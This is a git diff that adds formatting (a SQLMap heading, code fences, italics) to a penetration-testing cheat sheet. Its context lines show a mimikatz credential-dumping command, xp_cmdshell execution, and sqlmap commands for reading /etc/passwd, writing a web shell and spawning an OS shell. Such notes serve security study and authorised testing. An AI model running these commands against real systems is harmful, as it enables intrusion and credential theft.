@@ -275,9 +275,10 @@ EXEC xp_cmdshell 'whoami'
 ```
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
-
+#### SQLMap:
+```
 Command 	Description
-sqlmap -h 	View the basic help menu
+sqlmap -h 	*View the basic help menu*
 sqlmap -hh 	View the advanced help menu
 sqlmap -u "http://www.example.com/vuln.php?id=1" --batch 	Run SQLMap without asking for user input
 sqlmap 'http://www.example.com/' --data 'uid=1&name=test' 	SQLMap with POST request
@@ -302,3 +303,4 @@ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba 	Check for DBA privil
 sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd" 	Reading a local file
 sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php" 	Writing a file
 sqlmap -u "http://www.example.com/?id=1" --os-shell 	Spawning an OS shell
+```
